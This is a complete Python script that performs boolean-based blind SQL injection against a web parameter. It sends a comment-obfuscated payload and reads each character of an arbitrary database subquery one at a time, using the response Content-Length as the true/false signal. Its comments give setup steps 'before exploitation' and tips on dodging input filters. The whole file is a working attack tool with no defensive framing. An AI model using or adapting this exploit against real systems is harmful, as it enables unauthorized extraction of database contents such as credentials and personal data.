import requests
import sys

# Todos before exploitation: 
# change 1. truth anchor (could be content length as indicator or specific string in response f.e.), 2. injection_string around %s
# Note regarding payload, use concat (group_concat) function function when selecting if payload fails

def sqli(url, inj_str):
    for j in range(32, 126):
        # use ascii representatives to avoid any potential payload restrictions (like f.e. no whitespaces allowed)
        target = "%s%s" % (url, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        # check if true or false (truth anchor)
        if (content_length > 20):
            return j
    return None    

def main():
    if len(sys.argv) != 3:
        print("(+) usage: %s <targetUrl> <cleanSubQuery>"  % sys.argv[0])
        print('(+) eg: %s \'http://192.168.121.103/vulnerable.php?q=\' \'SELECT user()\''  % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    cleanSubQuery = sys.argv[2]
    print("(+) Retrieving results for following Query:")
    print(cleanSubQuery)

    # set length according to target (if known beforehand, otherwise use high number)
    for i in range(1, 20):
        injection_string = "test')/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]%%23" % (cleanSubQuery,i)
        extracted_char = chr(sqli(url, injection_string))
        sys.stdout.write(extracted_char)
        sys.stdout.flush()
    print("\n(+) done!")

if __name__ == "__main__":
    main()
